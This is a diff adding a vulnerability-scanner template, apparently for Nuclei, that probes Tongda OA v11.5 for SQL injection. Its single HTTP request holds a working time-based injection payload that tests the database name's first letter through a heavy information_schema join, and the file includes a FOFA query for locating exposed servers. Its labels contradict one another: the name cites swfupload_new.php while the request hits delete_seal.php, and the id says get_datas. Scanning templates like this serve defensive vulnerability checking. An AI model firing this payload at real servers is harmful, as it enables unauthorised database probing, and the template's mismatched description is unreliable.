@@ -1,0 +1,36 @@
+id: tongda-get_datas-sqli
+
+info:
+  name: Tongda OA v11.5 swfupload_new.php - SQL Injection
+  author: SleepingBag945
+  severity: high
+  description: |
+    There is a SQL injection vulnerability in the swfupload_new.php file of Tongda OA v11.5. An attacker can obtain sensitive information of the server through the vulnerability.
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/通达OA/通达OA%20v11.5%20swfupload_new.php%20SQL注入漏洞.html
+    - https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/tongda-swfupload-new-sql-inject.yaml
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="TDXK-通达OA"
+  tags: tongda,sqli,intrusive,vuln
+
+http:
+  - raw:
+      - |
+        @timeout: 5s
+        GET /general/system/seal_manage/iweboffice/delete_seal.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1 HTTP/1.1
+        Host: {{HostName}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=1'
+          - 'duration<=2'
+          - 'status_code == 200'
+        condition: and
